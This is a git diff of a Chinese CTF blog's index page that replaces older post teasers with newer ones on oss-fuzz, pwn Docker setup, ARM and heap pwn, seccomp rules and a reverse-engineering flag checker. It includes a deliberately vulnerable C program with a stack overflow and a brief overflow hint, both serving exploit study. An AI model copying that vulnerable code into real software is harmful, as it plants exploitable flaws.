-          <h2 id="0x01-什么是oss-fuzz"><a href="#0x01-什么是oss-fuzz" class="headerlink" title="0x01 什么是oss-fuzz"></a>0x01 什么是oss-fuzz</h2><p>谷歌的oss-fuzz能够针对开源软件进行持续的模糊测试，其测试开发团队也提到“OSS-Fuzz的目的是利用更新的模糊测试技术与可拓展的分布式执行相结合，提高一般软件基础架构的安全性与稳定性。OSS-Fuzz结合了多种模糊测试技术/漏洞捕捉技术（即原来的libfuzzer）与清洗技术（即原来的AddressSanitizer），并且通过ClusterFuzz为大规模可分布式执行提供了测试环境。”，当然fuzzer也可以选择AFL,libfuzzer</p>
-<p>先下载<a href="https://github.com/google/oss-fuzz" target="_blank" rel="noopener">源码</a></p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/05/26/oss-fuzz初探/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/15/pwn环境docker化/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="R4bb1t">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/n0va.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="R4bb1t的ctf博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/05/15/pwn环境docker化/" itemprop="url">pwn环境docker化</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-15T14:11:45+08:00">
-                2020-05-15
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker pull ubuntu:18.04</span></span><br><span class="line">18.04: Pulling from library/ubuntu</span><br><span class="line">23884877105a: Pull complete </span><br><span class="line">bc38caa0f5b9: Pull complete </span><br><span class="line">2910811b6c42: Pull complete </span><br><span class="line">36505266dcc6: Pull complete </span><br><span class="line">Digest: sha256:3235326357dfb65f1781dbc4df3b834546d8bf914e82cce58e6e6b676e23ce8f</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> ubuntu:18.04</span><br><span class="line">docker.io/library/ubuntu:18.04</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/05/15/pwn环境docker化/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/20/hfctf/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="R4bb1t">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/n0va.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="R4bb1t的ctf博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/20/hfctf/" itemprop="url">虎符ctf部分pwn题解</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-20T13:13:47+08:00">
-                2020-04-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="count"><a href="#count" class="headerlink" title="count"></a>count</h2><p>ARM pwn，虽然本地运行不起来，但是也不需要，直接挂远程就行了，</p>
-<p>先是200次循环计算出结果后，输入一串字符处有溢出，将变量覆盖为0x12235612调用后门</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/04/20/hfctf/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/13/解决git clone下载慢问题/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="R4bb1t">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/n0va.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="R4bb1t的ctf博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/13/解决git clone下载慢问题/" itemprop="url">解决git clone下载慢或失败问题</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-13T15:12:36+08:00">
-                2020-04-13
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-21T15:11:22+08:00">
+                2020-06-21
               </time>
             
 
@@ -1303,7 +1208,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/12/路由器漏洞挖掘入门之栈溢出/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/桂电2019re/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="R4bb1t">
@@ -1322,7 +1227,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/04/12/路由器漏洞挖掘入门之栈溢出/" itemprop="url">路由器漏洞挖掘入门之栈溢出</a></h1>
+                <a class="post-title-link" href="/2020/06/21/桂电2019re/" itemprop="url">桂电2019 re write up</a></h1>
         
 
         <div class="post-meta">
@@ -1334,8 +1239,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-12T13:48:32+08:00">
-                2020-04-12
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-21T15:11:22+08:00">
+                2020-06-21
               </time>
             
 
@@ -1357,8 +1262,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/IOT/" itemprop="url" rel="index">
-                    <span itemprop="name">IOT</span>
+                  <a href="/categories/re/" itemprop="url" rel="index">
+                    <span itemprop="name">re</span>
                   </a>
                 </span>
 
@@ -1395,17 +1300,12 @@
 
       
         
-          <h2 id="x86和MIPS指令集的差异"><a href="#x86和MIPS指令集的差异" class="headerlink" title="x86和MIPS指令集的差异"></a>x86和MIPS指令集的差异</h2><p>1、MIPS指令系统大量使用寄存器，包括返回地址也是存放在ra寄存器中的</p>
-<p>2、没有堆栈直接操作的指令，也就是就没有push 和pop 指令</p>
-<p>3、所有指令都是32位编码，也就是说所有的数据和指令都是4字节对齐</p>
-<blockquote>
-<p>由于MIPS固定指令长度，造成其编译后的二进制文件和内存占用空间比x86的要大</p>
-<p>MIPS指令集使用uclibc C标准库，x86使用libc的C标准库</p>
-</blockquote>
-<p>MIPS的指令用法和两者的差异可以参考<a href="https://blog.csdn.net/gujing001/article/details/8476685" target="_blank" rel="noopener">这里</a></p>
+          <h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><p>checksec 一下发现加了upx壳，upx -d 脱壳</p>
+<p>IDA f5发现</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">sub_4009AE</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">1629056</span> * *a1 != <span class="number">166163712</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6771600</span> * a1[<span class="number">1</span>] != <span class="number">731332800</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3682944</span> * a1[<span class="number">2</span>] != <span class="number">357245568</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10431000</span> * a1[<span class="number">3</span>] != <span class="number">1074393000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3977328</span> * a1[<span class="number">4</span>] != <span class="number">489211344</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5138336</span> * a1[<span class="number">5</span>] != <span class="number">518971936</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7532250</span> * a1[<span class="number">7</span>] != <span class="number">406741500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5551632</span> * a1[<span class="number">8</span>] != <span class="number">294236496</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3409728</span> * a1[<span class="number">9</span>] != <span class="number">177305856</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">13013670</span> * a1[<span class="number">10</span>] != <span class="number">650683500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6088797</span> * a1[<span class="number">11</span>] != <span class="number">298351053</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7884663</span> * a1[<span class="number">12</span>] != <span class="number">386348487</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8944053</span> * a1[<span class="number">13</span>] != <span class="number">438258597</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5198490</span> * a1[<span class="number">14</span>] != <span class="number">249527520</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4544518</span> * a1[<span class="number">15</span>] != <span class="number">445362764</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3645600</span> * a1[<span class="number">17</span>] != <span class="number">174988800</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10115280</span> * a1[<span class="number">16</span>] != <span class="number">981182160</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">9667504</span> * a1[<span class="number">18</span>] != <span class="number">493042704</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5364450</span> * a1[<span class="number">19</span>] != <span class="number">257493600</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">13464540</span> * a1[<span class="number">20</span>] != <span class="number">767478780</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5488432</span> * a1[<span class="number">21</span>] != <span class="number">312840624</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">14479500</span> * a1[<span class="number">22</span>] != <span class="number">1404511500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6451830</span> * a1[<span class="number">23</span>] != <span class="number">316139670</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6252576</span> * a1[<span class="number">24</span>] != <span class="number">619005024</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7763364</span> * a1[<span class="number">25</span>] != <span class="number">372641472</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7327320</span> * a1[<span class="number">26</span>] != <span class="number">373693320</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8741520</span> * a1[<span class="number">27</span>] != <span class="number">498266640</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8871876</span> * a1[<span class="number">28</span>] != <span class="number">452465676</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4086720</span> * a1[<span class="number">29</span>] != <span class="number">208422720</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">9374400</span> * a1[<span class="number">30</span>] == <span class="number">515592000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">5759124</span> * a1[<span class="number">31</span>] == <span class="number">719890500</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/04/12/路由器漏洞挖掘入门之栈溢出/#more" rel="contents">
+            <a class="btn" href="/2020/06/21/桂电2019re/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1456,7 +1356,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/31/re2dl_runtime_resolve/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/搭建2.29pwn环境遇到的坑/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="R4bb1t">
@@ -1475,7 +1375,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/03/31/re2dl_runtime_resolve/" itemprop="url">ret2dl_runtime_resolve</a></h1>
+                <a class="post-title-link" href="/2020/06/21/搭建2.29pwn环境遇到的坑/" itemprop="url">docker内搭建2.29pwn环境遇到的坑</a></h1>
         
 
         <div class="post-meta">
@@ -1487,8 +1387,132 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-31T09:23:51+08:00">
-                2020-03-31
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-21T15:11:22+08:00">
+                2020-06-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h2 id="update-404"><a href="#update-404" class="headerlink" title="update 404"></a>update 404</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Ign:1 http://security.ubuntu.com/ubuntu disco-security InRelease</span><br><span class="line">Ign:2 http://archive.ubuntu.com/ubuntu disco InRelease</span><br><span class="line">Err:3 http://security.ubuntu.com/ubuntu disco-security Release</span><br><span class="line">  404  Not Found [IP: 91.189.91.38 80]</span><br><span class="line">Ign:4 http://archive.ubuntu.com/ubuntu disco-updates InRelease</span><br><span class="line">Ign:5 http://archive.ubuntu.com/ubuntu disco-backports InRelease</span><br><span class="line">Err:6 http://archive.ubuntu.com/ubuntu disco Release</span><br><span class="line">  404  Not Found [IP: 91.189.88.152 80]</span><br><span class="line">Err:7 http://archive.ubuntu.com/ubuntu disco-updates Release</span><br><span class="line">  404  Not Found [IP: 91.189.88.152 80]</span><br><span class="line">Err:8 http://archive.ubuntu.com/ubuntu disco-backports Release</span><br><span class="line">  404  Not Found [IP: 91.189.88.152 80]</span><br><span class="line">Reading package lists... Done</span><br><span class="line">E: The repository <span class="string">'http://security.ubuntu.com/ubuntu disco-security Release'</span> does not have a Release file.</span><br><span class="line">N: Updating from such a repository can<span class="string">'t be done securely, and is therefore disabled by default.</span></span><br><span class="line"><span class="string">N: See apt-secure(8) manpage for repository creation and user configuration details.</span></span><br><span class="line"><span class="string">E: The repository '</span>http://archive.ubuntu.com/ubuntu disco Release<span class="string">' does not have a Release file.</span></span><br><span class="line"><span class="string">N: Updating from such a repository can'</span>t be <span class="keyword">done</span> securely, and is therefore disabled by default.</span><br><span class="line">N: See apt-secure(8) manpage <span class="keyword">for</span> repository creation and user configuration details.</span><br><span class="line">E: The repository <span class="string">'http://archive.ubuntu.com/ubuntu disco-updates Release'</span> does not have a Release file.</span><br><span class="line">N: Updating from such a repository can<span class="string">'t be done securely, and is therefore disabled by default.</span></span><br><span class="line"><span class="string">N: See apt-secure(8) manpage for repository creation and user configuration details.</span></span><br><span class="line"><span class="string">E: The repository '</span>http://archive.ubuntu.com/ubuntu disco-backports Release<span class="string">' does not have a Release file.</span></span><br><span class="line"><span class="string">N: Updating from such a repository can'</span>t be <span class="keyword">done</span> securely, and is therefore disabled by default.</span><br><span class="line">N: See apt-secure(8) manpage <span class="keyword">for</span> repository creation and user configuration details.</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/06/21/搭建2.29pwn环境遇到的坑/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/UNCTF-orwheap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="R4bb1t">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/n0va.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R4bb1t的ctf博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/06/21/UNCTF-orwheap/" itemprop="url">UNCTF-orwheap</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-21T15:11:22+08:00">
+                2020-06-21
               </time>
             
 
@@ -1548,12 +1572,10 @@
 
       
         
-          <p>认真梳理一下re2dl_runtime_resolve</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>写个c程序自己测试一下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">28</span>];</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">128</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> name[] = <span class="string">"input your name: "</span>;</span><br><span class="line">	write(<span class="number">1</span>,name,<span class="built_in">strlen</span>(name));</span><br><span class="line">	vuln();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -g -m32 -fno-stack-protector test.c test32</span></span><br></pre></td></tr></table></figure>
+          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools dump ./pwn </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011</span><br><span class="line"> 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010</span><br><span class="line"> 0006: 0x20 0x00 0x00 0x00000024  A = count &gt;&gt; 32 # write(fd, buf, count)</span><br><span class="line"> 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010</span><br><span class="line"> 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count)</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/03/31/re2dl_runtime_resolve/#more" rel="contents">
+            <a class="btn" href="/2020/06/21/UNCTF-orwheap/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1604,7 +1626,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/29/DynELF实现无libc泄露函数地址/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/巅峰极客/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="R4bb1t">
@@ -1623,7 +1645,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/03/29/DynELF实现无libc泄露函数地址/" itemprop="url">DynELF实现无libc.so泄露函数地址</a></h1>
+                <a class="post-title-link" href="/2020/06/21/巅峰极客/" itemprop="url">巅峰极客 pwn 题解</a></h1>
         
 
         <div class="post-meta">
@@ -1635,8 +1657,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-29T19:55:25+08:00">
-                2020-03-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-21T15:11:22+08:00">
+                2020-06-21
               </time>
             
 
@@ -1696,10 +1718,11 @@
 
       
         
